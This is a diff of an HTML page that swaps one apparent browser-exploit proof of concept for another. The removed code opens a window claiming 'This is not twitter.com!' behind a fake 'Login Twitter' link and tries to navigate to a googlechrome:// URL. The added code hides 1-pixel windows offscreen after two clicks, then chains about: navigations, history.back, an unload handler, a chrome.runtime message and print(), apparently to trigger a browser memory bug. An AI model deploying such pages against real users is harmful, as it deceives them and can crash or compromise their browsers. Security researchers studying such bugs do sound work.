@@ -1,16 +1,36 @@
-
+<body>
+<h1>Click anywhere twice</h1>
 <script>
-  function next() {
-          w.location = "document.location='googlechrome://about:about";
-        }
+WINDOW_COUNT = 2;
 
-  function f() {
-    w = window.open("");
-    w.alert('hello world')
-    w.document.write('<h2>This is not twitter.com!</h2>');
-    w.location = "https://amazon.com";
-    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
-  }
+runAsync = func => chrome.runtime.sendMessage("a", "", {}, func);
+
+windowArray = [];
+document.onclick = () => {
+	if (windowArray.length < WINDOW_COUNT) {
+		var wnd = open("", "", "width=1,height=1");
+		wnd.moveTo(10000, 10000);
+		windowArray.push(wnd);
+
+		if (windowArray.length == WINDOW_COUNT) {
+			document.onclick = null;
+
+			for (var i = 0; i < 2; ++i) {
+				var a = windowArray[0].document.createElement("a");
+				a.href = "about:page" + i;
+				a.click();
+			}
+
+			windowArray[0].history.back();
+			windowArray[0].onunload = () => {
+				for (var window of windowArray)
+					window.close();
+			}
+
+			runAsync(() => windowArray[1].close());
+			windowArray[1].print();
+		}
+	}
+}
 </script>
-
-<a href="#" onclick="f()">Login Twitter</a>
+</body>
